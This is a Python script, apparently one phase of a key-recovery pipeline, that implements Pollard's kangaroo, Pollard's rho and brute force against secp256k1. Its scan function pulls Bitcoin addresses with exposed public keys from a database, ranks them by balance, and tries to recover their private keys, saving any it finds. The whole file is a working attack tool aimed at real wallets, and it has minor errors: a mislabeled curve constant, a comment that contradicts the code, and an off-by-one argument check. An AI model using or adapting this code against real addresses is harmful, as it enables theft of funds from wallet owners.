#!/usr/bin/env python3
"""
Phase 3.3 — Pollard's Kangaroo Algorithm for Bounded ECDLP

When lattice attacks narrow the private key to a bounded range
(e.g., we know d is in [a, b] where b-a < 2^80), Pollard's
kangaroo algorithm can find the exact key in O(sqrt(b-a)) time.

Also implements Pollard's Rho as a fallback for smaller ranges.

Uses distinguished points optimization for efficiency.
Multi-threaded for parallelism.
"""
import hashlib
import random
import time
import threading
import ecdsa
from ecdsa import SECP256k1 as SECP256k1_pure, numbertheory
try:
    from fastecdsa.curve import secp256k1 as SECP256k1_fast
    from fastecdsa.point import Point
    FASE_AVAILABLE = True
except ImportError:
    FASE_AVAILABLE = False
from db_manager import get_connection, add_recovered_key

P = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
if FASE_AVAILABLE:
    G = SECP256k1_fast.G
    N = SECP256k1_fast.q
else:
    G = SECP256k1_pure.generator
    N = SECP256k1_pure.order

def point_to_int(point):
    """Convert an EC point to a deterministic integer for hashing."""
    if FASE_AVAILABLE:
        return point.x
    return int(point.x())

def hash_point(point, num_jumps):
    """Map a point to a jump index in [0, num_jumps)."""
    x = point_to_int(point)
    return x % num_jumps


def is_distinguished(point, dist_bits):
    """Check if point has dist_bits leading zeros (distinguished point)."""
    x = point_to_int(point)
    return (x & ((1 << dist_bits) - 1)) == 0


# ============================================================
# Pollard's Kangaroo (Lambda Method)
# ============================================================

def kangaroo_search(target_pubkey, lower, upper, max_time=300):
    """
    Pollard's kangaroo search for d in [lower, upper] such that d*G = target_pubkey.
    
    Uses wild and tame kangaroos with distinguished points.
    Expected runtime: O(sqrt(upper - lower))
    
    Args:
        target_pubkey: ecdsa.PointJacobi or fastecdsa.Point
        lower: int — lower bound of search range
        upper: int — upper bound of search range
        max_time: int — maximum seconds to search
    
    Returns:
        int — private key, or None
    """
    interval = upper - lower
    if interval <= 0:
        return None

    # For very small ranges, just brute force
    if interval < 100000:
        return brute_force_range(target_pubkey, lower, upper)

    print(f"    Kangaroo search: range [{lower}, {upper}] (2^{interval.bit_length()} candidates)")

    # Jump sizes: powers of 2 up to sqrt(interval)
    num_jumps = max(16, min(64, interval.bit_length()))
    jump_sizes = [1 << (i * interval.bit_length() // num_jumps) for i in range(num_jumps)]
    mean_jump = sum(jump_sizes) / len(jump_sizes)

    # Pre-compute jump points
    jump_points = [int(s) * G for s in jump_sizes]

    # Distinguished point bit count
    dist_bits = max(1, (interval.bit_length() // 4))

    # Tame kangaroo: start at midpoint of range
    tame_start = (lower + upper) // 2
    tame_pos = tame_start * G
    tame_dist = 0  # Total distance traveled
    tame_traps = {}  # Distinguished points: point_x -> distance

    # Wild kangaroo: start at target point (unknown d)
    wild_pos = target_pubkey
    wild_dist = 0
    wild_traps = {}

    start_time = time.time()
    steps = 0
    max_steps = int(4 * (interval ** 0.5))  # Expected steps

    while steps < max_steps and (time.time() - start_time) < max_time:
        steps += 1

        # Move tame kangaroo
        j = hash_point(tame_pos, num_jumps)
        tame_pos = tame_pos + jump_points[j]
        tame_dist += jump_sizes[j]

        if is_distinguished(tame_pos, dist_bits):
            px = point_to_int(tame_pos)
            tame_traps[px] = tame_dist

            # Check for collision
            if px in wild_traps:
                d = tame_start + tame_dist - wild_dist
                d = d % N
                if d > 0 and verify_key_point(d, target_pubkey):
                    print(f"    Kangaroo found key in {steps} steps!")
                    return d

        # Move wild kangaroo
        j = hash_point(wild_pos, num_jumps)
        wild_pos = wild_pos + jump_points[j]
        wild_dist += jump_sizes[j]

        if is_distinguished(wild_pos, dist_bits):
            px = point_to_int(wild_pos)
            wild_traps[px] = wild_dist

            # Check for collision
            if px in tame_traps:
                d = tame_start + tame_traps[px] - wild_dist
                d = d % N
                if d > 0 and verify_key_point(d, target_pubkey):
                    print(f"    Kangaroo found key in {steps} steps!")
                    return d

        if steps % 100000 == 0:
            elapsed = time.time() - start_time
            print(f"    Steps: {steps}, Traps: T={len(tame_traps)}, W={len(wild_traps)}, "
                  f"Time: {elapsed:.0f}s")

    print(f"    Kangaroo exhausted after {steps} steps")
    return None


def verify_key_point(d, target_pubkey):
    """Verify that d*G == target_pubkey."""
    try:
        if FASE_AVAILABLE:
            computed = int(d) * G
            return computed.x == target_pubkey.x and computed.y == target_pubkey.y
        else:
            computed = int(d) * G
            return computed == target_pubkey
    except:
        return False


# ============================================================
# Pollard's Rho (for smaller ranges)
# ============================================================

def pollard_rho(target_pubkey, max_steps=10000000, max_time=120):
    """
    Pollard's Rho algorithm for ECDLP.
    Uses Floyd's cycle detection with three partitions.
    """
    print(f"    Pollard's Rho: max {max_steps} steps")

    def step(R, a, b):
        """One step of the random walk."""
        x = point_to_int(R) % 3
        if x == 0:
            return R + target_pubkey, a, (b + 1) % N
        elif x == 1:
            return R + R, (2 * a) % N, (2 * b) % N
        else:
            return R + G, (a + 1) % N, b

    # Initialize
    a1, b1 = random.randint(1, N - 1), random.randint(1, N - 1)
    R1 = a1 * G + b1 * target_pubkey
    R2, a2, b2 = R1, a1, b1

    start_time = time.time()
    for i in range(max_steps):
        if (time.time() - start_time) > max_time:
            break

        # Tortoise: one step
        R1, a1, b1 = step(R1, a1, b1)
        # Hare: two steps
        R2, a2, b2 = step(R2, a2, b2)
        R2, a2, b2 = step(R2, a2, b2)

        if R1 == R2:
            # Collision found
            if b1 == b2:
                # Bad collision, restart
                a1, b1 = random.randint(1, N - 1), random.randint(1, N - 1)
                R1 = a1 * G + b1 * target_pubkey
                R2, a2, b2 = R1, a1, b1
                continue

            d = ((a1 - a2) * pow(b2 - b1, -1, N)) % N
            if verify_key_point(d, target_pubkey):
                print(f"    Rho found key in {i} steps!")
                return d

    return None


# ============================================================
# Brute Force for Tiny Ranges
# ============================================================

def brute_force_range(target_pubkey, lower, upper):
    """Direct brute force for small key ranges."""
    size = upper - lower
    print(f"    Brute forcing range [{lower}, {upper}] ({size} candidates)")

    for d in range(lower, upper + 1):
        if verify_key_point(d, target_pubkey):
            return d

        if (d - lower) % 50000 == 0 and d > lower:
            print(f"    Brute force: {d - lower}/{size}")

    return None


# ============================================================
# Integration with Lattice Partial Results
# ============================================================

def get_pubkey_for_address(address):
    """Retrieve the public key for an address from its signatures."""
    conn = get_connection()
    c = conn.cursor()
    c.execute("SELECT pubkey_hex FROM signatures WHERE address = ? AND pubkey_hex IS NOT NULL AND pubkey_hex != '' LIMIT 1",
              (address,))
    row = c.fetchone()
    conn.close()

    if row and row[0]:
        try:
            pub_hex = row[0]
            # Handle both compressed (33 bytes) and uncompressed (65 bytes)
            pub_bytes = bytes.fromhex(pub_hex)
            
            if FASE_AVAILABLE:
                from fastecdsa.encoding.sec1 import SEC1Encoder
                point = SEC1Encoder.decode_public_key(pub_bytes, SECP256k1_fast)
                return point
            else:
                if pub_hex.startswith('04'):
                    # Uncompressed
                    vk = ecdsa.VerifyingKey.from_string(pub_bytes[1:], curve=SECP256k1_pure)
                else:
                    # Compressed
                    vk = ecdsa.VerifyingKey.from_string(pub_bytes, curve=SECP256k1_pure)
                return vk.pubkey.point
        except Exception as e:
            # print(f"    Error parsing pubkey {row[0]}: {e}")
            pass
    return None


def kangaroo_from_lattice_hint(address, center, range_bits=40):
    """
    When lattice gives us a partial result (d ≈ center ± 2^range_bits),
    use kangaroo to find the exact key.
    """
    target = get_pubkey_for_address(address)
    if target is None:
        print(f"    No public key available for {address}")
        return None

    half_range = 1 << range_bits
    lower = max(1, center - half_range)
    upper = min(N - 1, center + half_range)

    return kangaroo_search(target, lower, upper)


def run_kangaroo_scan(max_addresses=10, target_address=None):
    """
    Run kangaroo on addresses where we have public keys and
    can define bounded search ranges from lattice partial results.
    """
    print("=" * 60)
    print("POLLARD'S KANGAROO / RHO SCAN")
    print("=" * 60)

    conn = get_connection()
    c = conn.cursor()

    if target_address:
        c.execute("""
            SELECT DISTINCT s.address, 
                   COALESCE(a.current_balance, a.balance, 0) as bal
            FROM signatures s
            JOIN addresses a ON s.address = a.address
            WHERE s.address = ? AND s.pubkey_hex IS NOT NULL AND s.pubkey_hex != ''
        """, (target_address,))
    else:
        # Find addresses with pubkeys and prior vulnerability findings
        c.execute("""
            SELECT DISTINCT s.address, 
                   COALESCE(a.current_balance, a.balance, 0) as bal
            FROM signatures s
            JOIN addresses a ON s.address = a.address
            WHERE s.pubkey_hex IS NOT NULL AND s.pubkey_hex != ''
            ORDER BY bal DESC
            LIMIT ?
        """, (max_addresses,))
    targets = c.fetchall()
    conn.close()

    if not targets:
        print("  No addresses with known public keys")
        return []

    found = []
    for addr, bal in targets:
        print(f"\n  {addr[:35]}... ({bal} BTC)")
        pubkey = get_pubkey_for_address(addr)
        if pubkey is None:
            continue

        # Try small range brute force first (keys 1 to 2^20)
        key = brute_force_range(pubkey, 1, min(1 << 20, 1048576))
        if key:
            key_hex = hex(key)[2:].zfill(64)
            print(f"  !!! KEY via Brute Force: {key_hex[:30]}...")
            add_recovered_key(addr, key_hex, method='Kangaroo Brute Force')
            found.append((addr, key_hex))
            continue

        print(f"    No key in small range")

    print(f"\n  Kangaroo/Rho scan complete: {len(found)} keys recovered")
    return found


if __name__ == "__main__":
    import sys
    max_addr = int(sys.argv[1]) if len(sys.argv) > 2 else 10
    run_kangaroo_scan(max_addresses=max_addr)
